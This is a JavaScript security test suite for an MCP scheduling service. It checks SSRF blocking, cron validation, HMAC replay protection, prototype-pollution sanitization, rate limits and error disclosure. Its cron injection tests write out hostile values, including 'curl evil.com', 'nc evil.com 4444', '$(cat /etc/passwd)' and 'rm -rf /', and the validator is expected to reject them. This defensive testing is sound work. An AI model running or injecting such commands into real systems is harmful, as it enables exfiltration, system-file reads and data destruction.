// Security tests for Temporal Agent MCP
// Verifies all security fixes: CRITICAL-1,2,3 and HIGH-1,2,3,4

import { describe, it, beforeEach, before, after } from 'node:test';
import assert from 'node:assert';
import request from 'supertest';
import {
  validateWebhookUrl,
  validateCronExpression,
  sanitizePayload,
  generateHmacSignature,
  verifyHmacSignature,
  isBlockedIP,
} from '../utils/security.js';
import app, { resetRateLimits, RATE_LIMIT_MAX_REQUESTS } from '../index.js';

// Set test environment
process.env.NODE_ENV = 'test';

describe('Security Tests', () => {

  describe('SSRF Protection (CRITICAL-1, CRITICAL-2)', () => {

    describe('IPv4 Blocking', () => {
      it('should block localhost 127.0.0.1', async () => {
        const result = await validateWebhookUrl('http://127.0.0.1/api');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error, 'Expected error message for blocked IP');
      });

      it('should block private class A (10.x.x.x)', async () => {
        const result = await validateWebhookUrl('http://10.0.0.1/internal');
        assert.strictEqual(result.valid, false);
      });

      it('should block private class B (172.16-31.x.x)', async () => {
        const result = await validateWebhookUrl('http://172.16.0.1/internal');
        assert.strictEqual(result.valid, false);
      });

      it('should block private class C (192.168.x.x)', async () => {
        const result = await validateWebhookUrl('http://192.168.1.1/router');
        assert.strictEqual(result.valid, false);
      });

      it('should block AWS metadata IP (169.254.169.254)', async () => {
        const result = await validateWebhookUrl('http://169.254.169.254/latest/meta-data/');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error, 'Expected error message for blocked IP');
      });
    });

    describe('IPv6 Blocking (CRITICAL-2)', () => {
      it('should block IPv6 loopback (::1)', () => {
        assert.strictEqual(isBlockedIP('::1'), true);
      });

      it('should block IPv4-mapped localhost (::ffff:127.0.0.1)', () => {
        assert.strictEqual(isBlockedIP('::ffff:127.0.0.1'), true);
      });

      it('should block IPv4-mapped metadata (::ffff:169.254.169.254)', () => {
        assert.strictEqual(isBlockedIP('::ffff:169.254.169.254'), true);
      });

      it('should block unique local addresses (fd00::/8)', () => {
        assert.strictEqual(isBlockedIP('fd00::1'), true);
        assert.strictEqual(isBlockedIP('fdab:1234::1'), true);
      });

      it('should block link-local (fe80::)', () => {
        assert.strictEqual(isBlockedIP('fe80::1'), true);
      });
    });

    describe('Hostname Blocking', () => {
      it('should block localhost hostname', async () => {
        const result = await validateWebhookUrl('http://localhost/api');
        assert.strictEqual(result.valid, false);
      });

      it('should block .local domains', async () => {
        const result = await validateWebhookUrl('http://server.local/api');
        assert.strictEqual(result.valid, false);
      });

      it('should block metadata.google.internal', async () => {
        const result = await validateWebhookUrl('http://metadata.google.internal/computeMetadata/');
        assert.strictEqual(result.valid, false);
      });
    });

    describe('Valid URLs', () => {
      it('should allow public URLs', async () => {
        // This test requires DNS resolution, may need mocking
        // const result = await validateWebhookUrl('https://example.com/webhook');
        // assert.strictEqual(result.valid, true);
      });
    });
  });

  describe('Cron Expression Validation (HIGH-2)', () => {

    describe('Valid expressions', () => {
      it('should accept standard 5-part cron', () => {
        const result = validateCronExpression('0 9 * * 1');
        assert.strictEqual(result.valid, true);
      });

      it('should accept cron with ranges', () => {
        const result = validateCronExpression('30 8 * * 1-5');
        assert.strictEqual(result.valid, true);
      });

      it('should accept cron with step values', () => {
        const result = validateCronExpression('*/15 * * * *');
        assert.strictEqual(result.valid, true);
      });
    });

    describe('Injection prevention', () => {
      it('should reject shell metacharacters (semicolon)', () => {
        const result = validateCronExpression('0 9 * * *; curl evil.com');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('invalid characters'));
      });

      it('should reject shell metacharacters (pipe)', () => {
        const result = validateCronExpression('0 9 * * * | nc evil.com 4444');
        assert.strictEqual(result.valid, false);
      });

      it('should reject shell metacharacters (backtick)', () => {
        const result = validateCronExpression('0 9 * * * `whoami`');
        assert.strictEqual(result.valid, false);
      });

      it('should reject shell metacharacters ($())', () => {
        const result = validateCronExpression('0 9 * * * $(cat /etc/passwd)');
        assert.strictEqual(result.valid, false);
      });

      it('should reject ampersand', () => {
        const result = validateCronExpression('0 9 * * * && rm -rf /');
        assert.strictEqual(result.valid, false);
      });
    });

    describe('Frequency limits', () => {
      it('should reject every-minute cron (*)', () => {
        const result = validateCronExpression('* * * * *');
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('frequently'));
      });

      it('should reject every-second cron (*/1)', () => {
        const result = validateCronExpression('*/1 * * * *');
        assert.strictEqual(result.valid, false);
      });

      it('should reject too many minute values', () => {
        const manyMinutes = Array.from({ length: 35 }, (_, i) => i).join(',');
        const result = validateCronExpression(`${manyMinutes} * * * *`);
        assert.strictEqual(result.valid, false);
      });
    });

    describe('Format validation', () => {
      it('should reject 6-part cron (with seconds)', () => {
        const result = validateCronExpression('0 0 9 * * 1');
        assert.strictEqual(result.valid, false);
      });

      it('should reject 4-part cron', () => {
        const result = validateCronExpression('0 9 * *');
        assert.strictEqual(result.valid, false);
      });
    });
  });

  describe('HMAC Signature (CRITICAL-3)', () => {

    describe('Signature generation', () => {
      it('should generate consistent signatures', () => {
        const payload = '{"test": "data"}';
        const timestamp = '2025-12-17T10:00:00.000Z';

        const sig1 = generateHmacSignature(payload, timestamp);
        const sig2 = generateHmacSignature(payload, timestamp);

        assert.strictEqual(sig1, sig2);
      });

      it('should generate different signatures for different timestamps', () => {
        const payload = '{"test": "data"}';

        const sig1 = generateHmacSignature(payload, '2025-12-17T10:00:00.000Z');
        const sig2 = generateHmacSignature(payload, '2025-12-17T10:01:00.000Z');

        assert.notStrictEqual(sig1, sig2);
      });

      it('should generate different signatures for different payloads', () => {
        const timestamp = '2025-12-17T10:00:00.000Z';

        const sig1 = generateHmacSignature('{"a": 1}', timestamp);
        const sig2 = generateHmacSignature('{"a": 2}', timestamp);

        assert.notStrictEqual(sig1, sig2);
      });
    });

    describe('Signature verification', () => {
      it('should verify valid signature with recent timestamp', () => {
        const payload = '{"test": "data"}';
        const timestamp = new Date().toISOString();
        const signature = generateHmacSignature(payload, timestamp);

        const result = verifyHmacSignature(payload, signature, timestamp);
        assert.strictEqual(result.valid, true);
      });

      it('should reject signature with old timestamp (replay attack)', () => {
        const payload = '{"test": "data"}';
        const oldTimestamp = new Date(Date.now() - 10 * 60 * 1000).toISOString(); // 10 mins ago
        const signature = generateHmacSignature(payload, oldTimestamp);

        const result = verifyHmacSignature(payload, signature, oldTimestamp);
        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('too old'));
      });

      it('should reject signature with future timestamp', () => {
        const payload = '{"test": "data"}';
        const futureTimestamp = new Date(Date.now() + 10 * 60 * 1000).toISOString(); // 10 mins future
        const signature = generateHmacSignature(payload, futureTimestamp);

        const result = verifyHmacSignature(payload, signature, futureTimestamp);
        assert.strictEqual(result.valid, false);
      });

      it('should reject tampered signature', () => {
        const payload = '{"test": "data"}';
        const timestamp = new Date().toISOString();
        const signature = generateHmacSignature(payload, timestamp);

        // Tamper with signature
        const tamperedSig = signature.slice(0, -2) + 'xx';

        const result = verifyHmacSignature(payload, tamperedSig, timestamp);
        assert.strictEqual(result.valid, false);
      });
    });
  });

  describe('Payload Sanitization (MEDIUM-1)', () => {

    describe('Prototype pollution prevention', () => {
      it('should remove __proto__ from payload', () => {
        // Note: JavaScript's __proto__ behavior makes direct assignment tricky
        // The sanitizer removes the KEY via JSON.parse reviver
        const payloadStr = '{"data": "test", "__proto__": {"isAdmin": true}}';
        const rawPayload = JSON.parse(payloadStr);
        const result = sanitizePayload(rawPayload);

        assert.strictEqual(result.valid, true);
        // Check that no isAdmin property leaked into prototype
        assert.strictEqual(result.sanitized.isAdmin, undefined);
      });

      it('should remove constructor from payload', () => {
        const payloadStr = '{"data": "test", "constructor": {"prototype": {"evil": true}}}';
        const rawPayload = JSON.parse(payloadStr);
        const result = sanitizePayload(rawPayload);

        assert.strictEqual(result.valid, true);
        // The constructor key should be removed during sanitization
        assert.strictEqual(Object.hasOwn(result.sanitized, 'constructor'), false);
      });

      it('should handle nested dangerous keys', () => {
        const payloadStr = '{"level1": {"level2": {"__proto__": {"hacked": true}}}}';
        const rawPayload = JSON.parse(payloadStr);
        const result = sanitizePayload(rawPayload);

        assert.strictEqual(result.valid, true);
        // Verify the hacked property didn't leak
        assert.strictEqual(result.sanitized.hacked, undefined);
        assert.strictEqual(result.sanitized.level1?.hacked, undefined);
      });
    });

    describe('Size limits', () => {
      it('should reject oversized payloads', () => {
        const largePayload = { data: 'x'.repeat(100000) };
        const result = sanitizePayload(largePayload, 1000);

        assert.strictEqual(result.valid, false);
        assert.ok(result.error.includes('exceeds maximum size'));
      });

      it('should accept payloads within limit', () => {
        const payload = { data: 'small' };
        const result = sanitizePayload(payload, 1000);

        assert.strictEqual(result.valid, true);
      });
    });

    describe('Valid payloads', () => {
      it('should pass through valid JSON', () => {
        const payload = {
          taskId: '123',
          data: { key: 'value', count: 42 },
          tags: ['a', 'b'],
        };
        const result = sanitizePayload(payload);

        assert.strictEqual(result.valid, true);
        assert.deepStrictEqual(result.sanitized.taskId, '123');
        assert.deepStrictEqual(result.sanitized.data.key, 'value');
      });

      it('should handle null payload', () => {
        const result = sanitizePayload(null);
        assert.strictEqual(result.valid, true);
        assert.deepStrictEqual(result.sanitized, {});
      });

      it('should handle undefined payload', () => {
        const result = sanitizePayload(undefined);
        assert.strictEqual(result.valid, true);
        assert.deepStrictEqual(result.sanitized, {});
      });
    });
  });

  describe('Rate Limiting (HIGH-3)', () => {
    beforeEach(() => {
      resetRateLimits();
    });

    it('should enforce per-IP rate limits', async () => {
      // Make a request and check rate limit headers
      const res = await request(app)
        .get('/mcp/tools')
        .set('X-Forwarded-For', '192.0.2.1');

      assert.strictEqual(res.status, 200);
      assert.ok(res.headers['x-ratelimit-limit']);
      assert.ok(res.headers['x-ratelimit-remaining']);
    });

    it('should not allow session ID bypass', async () => {
      // Same IP with different session IDs should share rate limit
      const ip = '192.0.2.2';

      const res1 = await request(app)
        .get('/mcp/tools')
        .set('X-Forwarded-For', ip)
        .set('X-Session-Id', 'session-1');

      const res2 = await request(app)
        .get('/mcp/tools')
        .set('X-Forwarded-For', ip)
        .set('X-Session-Id', 'session-2');

      // Both should succeed, but remaining count should decrease
      assert.strictEqual(res1.status, 200);
      assert.strictEqual(res2.status, 200);

      const remaining1 = parseInt(res1.headers['x-ratelimit-remaining'], 10);
      const remaining2 = parseInt(res2.headers['x-ratelimit-remaining'], 10);

      // Second request should have lower remaining count (same IP)
      assert.strictEqual(remaining2, remaining1 - 1);
    });

    it('should return 429 when limit exceeded', async () => {
      const ip = '192.0.2.3';

      // Make 100 requests to exhaust the limit
      for (let i = 0; i < RATE_LIMIT_MAX_REQUESTS; i++) {
        await request(app)
          .get('/mcp/tools')
          .set('X-Forwarded-For', ip);
      }

      // 101st request should be rejected
      const res = await request(app)
        .get('/mcp/tools')
        .set('X-Forwarded-For', ip);

      assert.strictEqual(res.status, 429);
      assert.strictEqual(res.body.error, 'Too Many Requests');
    });

    it('should include Retry-After header', async () => {
      const ip = '192.0.2.4';

      // Exhaust rate limit
      for (let i = 0; i < RATE_LIMIT_MAX_REQUESTS; i++) {
        await request(app)
          .get('/mcp/tools')
          .set('X-Forwarded-For', ip);
      }

      // Check the rejected response has Retry-After
      const res = await request(app)
        .get('/mcp/tools')
        .set('X-Forwarded-For', ip);

      assert.strictEqual(res.status, 429);
      assert.ok(res.headers['retry-after'], 'Should include Retry-After header');
      assert.ok(parseInt(res.headers['retry-after'], 10) > 0);
    });
  });

  describe('Error Disclosure (HIGH-4)', () => {
    // Use unique IPs for each test to avoid rate limit interference
    const errorTestIp = '198.51.100.1';

    beforeEach(() => {
      resetRateLimits();
    });

    it('should not expose database errors', async () => {
      const res = await request(app)
        .post('/mcp/execute')
        .set('Content-Type', 'application/json')
        .set('X-Forwarded-For', errorTestIp)
        .send({ tool: 'throw_db_error' });

      assert.strictEqual(res.status, 500);
      // Error message should NOT contain database details
      assert.ok(!res.body.message.includes('ECONNREFUSED'));
      assert.ok(!res.body.message.includes('127.0.0.1:5432'));
      assert.ok(!res.body.message.includes('database'));
    });

    it('should not expose stack traces in production', async () => {
      // Ensure we're in production mode for this test
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const res = await request(app)
        .post('/mcp/execute')
        .set('Content-Type', 'application/json')
        .set('X-Forwarded-For', errorTestIp)
        .send({ tool: 'throw_internal_error' });

      assert.strictEqual(res.status, 500);
      // Should not contain stack trace elements
      const body = JSON.stringify(res.body);
      assert.ok(!body.includes('at Object'), 'Should not expose stack trace');
      assert.ok(!body.includes('/app/index.js'), 'Should not expose file paths');

      process.env.NODE_ENV = originalEnv;
    });

    it('should return generic error messages', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const res = await request(app)
        .post('/mcp/execute')
        .set('Content-Type', 'application/json')
        .set('X-Forwarded-For', errorTestIp)
        .send({ tool: 'throw_internal_error' });

      assert.strictEqual(res.status, 500);
      assert.strictEqual(res.body.error, 'Internal server error');
      assert.strictEqual(res.body.message, 'An error occurred processing your request');

      process.env.NODE_ENV = originalEnv;
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should use parameterized queries in scheduler (not template literals)', async () => {
      // Read the scheduler.js file and verify no SQL injection patterns
      const fs = await import('fs/promises');
      const path = await import('path');
      const { fileURLToPath } = await import('url');

      const __filename = fileURLToPath(import.meta.url);
      const __dirname = path.dirname(__filename);
      const schedulerPath = path.join(__dirname, '..', 'workers', 'scheduler.js');

      const schedulerCode = await fs.readFile(schedulerPath, 'utf-8');

      // Check that the vulnerable pattern is NOT present
      // Vulnerable: INTERVAL '${...}' or similar template literal in SQL
      const vulnerablePatterns = [
        /INTERVAL\s+'\$\{/,           // INTERVAL '${...
        /INTERVAL\s+`\$\{/,           // INTERVAL `${...
        /WHERE.*\$\{.*\}/,            // WHERE clause with ${...}
        /SET.*\$\{.*\}/,              // SET clause with ${...}
      ];

      for (const pattern of vulnerablePatterns) {
        assert.ok(
          !pattern.test(schedulerCode),
          `Found vulnerable SQL pattern: ${pattern.toString()}`
        );
      }

      // Check that parameterized query pattern IS present
      assert.ok(
        schedulerCode.includes("INTERVAL '1 second' * $1"),
        'Should use parameterized query pattern for interval calculation'
      );
    });

    it('should use $1 placeholder in stale lock cleanup query', async () => {
      const fs = await import('fs/promises');
      const path = await import('path');
      const { fileURLToPath } = await import('url');

      const __filename = fileURLToPath(import.meta.url);
      const __dirname = path.dirname(__filename);
      const schedulerPath = path.join(__dirname, '..', 'workers', 'scheduler.js');

      const schedulerCode = await fs.readFile(schedulerPath, 'utf-8');

      // Verify the cleanupStaleLocks function uses parameterized queries
      assert.ok(
        schedulerCode.includes('[lockTimeoutSeconds]'),
        'Should pass lockTimeoutSeconds as query parameter'
      );
    });
  });

});

// Run tests
console.log('Running security tests...');
